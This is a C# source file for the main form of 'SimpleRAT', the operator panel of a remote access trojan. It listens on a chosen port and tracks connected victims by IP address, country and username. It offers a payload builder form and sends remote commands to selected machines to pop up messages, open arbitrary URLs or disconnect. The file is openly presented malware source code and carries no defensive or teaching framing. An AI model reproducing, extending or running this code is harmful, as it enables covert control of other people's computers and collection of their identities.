using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.VisualBasic;

namespace SimpleRAT
{
    public partial class frmMain : Form
    {
        Listener server;
        Thread startListen;
        public frmMain()
        {
            InitializeComponent();
            server = new Listener();
        }

        void updateOnline(int count)
        {
            tslblOnline.Text = "Online: " + count.ToString();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            startListen = new Thread(listen);
            startListen.Start();
        }

        void listen()
        {
            server.BeginListen(int.Parse(Interaction.InputBox("Enter port:", "Select a port", "1997")));
            server.Received += new Listener.ReceivedEventHandler(server_Received);
            server.Disconnected += new Listener.DisconnectedEventHandler(server_Disconnected);
        }

        void server_Disconnected(Listener l, Info i)
        {
            Invoke(new _Remove(Remove), i);
        }

        void server_Received(Listener l, Info i, string received)
        {
            string[] cmd = received.Split('|'); 
            switch (cmd[0]) 
            {
                case "CONNECTION":
                    Invoke(new _Add(Add), i, cmd[1], cmd[2]);
                    break;
                case "STATUS":
                    Invoke(new _Status(Status), i, cmd[1]);
                    break;
            }
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        delegate void _Add(Info i, string country, string username);
        void Add(Info i, string country, string username)
        {
            string[] splitIP = i.RemoteAddress.Split(':');
            ListViewItem item = new ListViewItem();
            item.Text = splitIP[0]; 
            item.SubItems.Add(country); 
            item.SubItems.Add(username); 
            item.SubItems.Add("Connected!"); 
            item.Tag = i;
            lvConnections.Items.Add(item);

            updateOnline(lvConnections.Items.Count);
        }

        delegate void _Remove(Info i);
        void Remove(Info i)
        {
            foreach (ListViewItem item in lvConnections.Items)
            {
                if ((Info)item.Tag == i)
                {
                    item.Remove();
                    updateOnline(lvConnections.Items.Count);
                    break;
                }
            }
        }

        delegate void _Status(Info i, string status);
        void Status(Info i, string status)
        {
            foreach (ListViewItem item in lvConnections.Items)
            {
                if ((Info)item.Tag == i)
                {
                    item.SubItems[3].Text = status;
                    break;
                }
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmBuild build = new frmBuild();
            build.Show();
        }

        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string msg = Interaction.InputBox("Enter message:", "Send Messagebox", "SimpleRAT");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("MSGBOX|" + msg);
            }
        }

        private void openURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = Interaction.InputBox("Enter URL:", "Open URL", "http://www.google.com");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("OPENURL|" + url);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("DISCONNECT|");
            }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {

        }
    }
}
